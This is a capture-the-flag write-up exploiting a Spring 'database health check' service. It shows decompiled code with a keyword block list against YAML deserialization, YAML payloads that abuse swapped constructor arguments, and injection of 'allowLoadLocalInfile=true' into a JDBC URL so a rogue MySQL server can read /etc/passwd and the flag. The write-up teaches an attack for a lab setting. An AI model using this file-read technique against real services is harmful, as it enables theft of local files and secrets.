# HealthCheck as a Service

> [!NOTE]  
> \[🟢]&ensp;**EASY**:&emsp;`14` solves

<br />

You better check yo' self before you wreck yo' self

<br />

The task is given `HealthCheck.jar` file. This is a Spring application that checks the database connection from the YAML configuration file.

The JAR is not obfuscated and we can get the source code of the application for analysis.

## Key points:

1. ApiController - Handles HTTP requests and processes YAML user-input
```java
@RestController
public class ApiController {
   @PostMapping
   public String checkDatabaseHealth(@RequestBody String str) {
      Validator.validate(str);
      Map<String, Object> yamlConfig = (Map)this.yaml.load(str);
      DbConfig dbConfig = DbConfig.of(yamlConfig.get("hostname").toString(), 
                                    yamlConfig.get("port").toString(),
                                    yamlConfig.get("databaseType").toString(), 
                                    yamlConfig.get("databaseName").toString());
	 DbConfigModel dbConfigModel = new DbConfigModel(dbConfig.getDatabaseType(), dbConfig.getHostname(), dbConfig.getPort(), dbConfig.getDatabaseName());

 .   return this.connectionTestService.isConnectionOk(dbConfigModel) ? "Up" : "Down";
   }
}
```

2. Validator - Implements  security filtering:
```java
public static void validate(String payload) {
	String[] blockList = new String[]{"Script", "Engine", "ClassLoader"};
	String[] var2 = blockList;
	int var3 = blockList.length;
  
	for(int var4 = 0; var4 < var3; ++var4) {
		String s = var2[var4];
		
		if (payload.contains(s)) {
			throw new RuntimeException("Dont try to hack me");
		}
	}
}
```

In the `classpath.idx` file you can check which database drivers are supported
```
...
- "BOOT-INF/lib/snakeyaml-1.33.jar"
- "BOOT-INF/lib/mysql-connector-j-8.4.0.jar"
- "BOOT-INF/lib/ojdbc8-23.6.0.24.10.jar"
- "BOOT-INF/lib/kafka-clients-3.7.0.jar"
- "BOOT-INF/lib/postgresql-42.1.0.jar"
- "BOOT-INF/lib/mssql-jdbc-12.9.0.jre8-preview.jar"
...
```

## Analysis

1. Check how service work
```python
yml = """hostname: 127.0.0.1
port: 1337
databaseType: mysql
databaseName: kek
"""
```

2. Start simple listener on port 1337 `nc -nvlp 1337` and send this payload and get response `Down` without any interaction with our server =(
3. It's strange, lets dive in source code.
```java
public static DbConfig of(String hostname, String port, String databaseType, String databaseName) {
return new DbConfig(hostname, port, databaseType, databaseName);
}
```

but class constructor has another order of arguments.

```java
 private DbConfig(String databaseType, String hostname, String port, String databaseName)
```

4.  Let's send another payload with changed fields
 ```python
yml = """hostname: mysql
port: 127.0.0.1
databaseType: 1337
databaseName: kek
"""
```

5. Profit, we got a new connection on our `nc` server

## Exploit
1. We can setup a rogue mysql server to read local files from client. [mysql source code](https://github.com/mysql/mysql-connector-j/blob/release/8.x/src/main/protocol-impl/java/com/mysql/cj/protocol/a/NativeProtocol.java#L1784)
2. To read a local files we need to add a parameter `?allowLoadLocalInfile=true` to connection string. We can inject it with `databaseName`
```java
public void checkConnection() {

String jdbcUrl = "jdbc:" + this.databaseType + "://" + this.hostname + ":" + this.port + "/" + this.databaseName;
...
```
3. As a rouge server I used [Rogue Mysql server](https://github.com/rmb122/rogue_mysql_server) with config to read `/etc/passwd`
4. Send new payload
```python
yml = '''hostname: mysql
port: 127.0.0.1
databaseType: 1337
databaseName: kek?allowLoadLocalInfile=true'''
```
5. And on a rogue server we get a content of the `/etc/passwd`
6. Get the flag from `/home/app/flag.txt`. `rctf{t00_much_m4rsh411ing`

## Conclusion
Most likely, the author's intended solution was to bypass the `Validator` logic and exploiting CVE-2022-1471, but we used another approach with rogue mysql server.
